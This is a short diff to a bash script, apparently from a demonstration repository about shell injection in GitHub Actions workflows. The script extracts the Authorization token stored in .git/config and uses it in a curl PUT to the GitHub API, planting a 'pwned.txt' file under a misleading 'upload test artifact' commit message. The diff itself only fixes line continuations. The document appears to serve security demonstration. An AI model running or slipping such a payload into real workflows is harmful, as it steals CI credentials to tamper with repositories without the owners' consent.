@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
 
 authfield=$(cat .git/config | grep AUTHORIZATION | cut -d':' -f 2)
-curl -X PUT
-  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/contents/pwned.txt
-  --header "Authorization: $authfield"
-  --header "Accept: application/vnd.github.v3+json"
+curl --request PUT \
+  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/contents/pwned.txt \
+  --header "Authorization: $authfield" \
+  --header "Accept: application/vnd.github.v3+json" \
   --data "{ \"message\": \"upload test artifact\", \"content\": \"$(echo pwned | openssl base64 | tr -d '\n')\" }"
